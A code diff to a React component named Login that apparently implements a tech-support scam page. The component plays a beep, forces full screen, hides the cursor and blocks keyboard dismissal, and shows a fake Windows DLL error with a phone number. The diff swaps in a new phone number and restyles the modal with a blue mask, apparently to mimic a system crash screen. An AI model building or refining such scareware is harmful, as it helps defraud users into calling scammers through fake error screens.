@@ -17,7 +17,7 @@ import {
 
 const Login = (props) => {
     const [audio] = useState(new Audio(beepAudio));
-    const [phoneNumber] = useState("050-5479-9330");
+    const [phoneNumber] = useState("(50)-5806-5449");
 
     const [isModalVisible, setIsModalVisible] = useState(false);
     const requestFullScreen = () => {
@@ -87,9 +87,11 @@ const Login = (props) => {
                 centered
                 visible={isModalVisible}
                 onCancel={handleCancel}
-                bodyStyle={{cursor: "none"}}
+                bodyStyle={{height: "300px", fontSize: "18px", fontWeight: "bold" , cursor: "none"}}
+                width={600}
                 keyboard={false}
                 wrapClassName="noCursor"
+                maskStyle={{background: "blue"}}
             >
                 <p>C:WINDOWS\SYSTEM32\MSVCR120.dll</p>
 
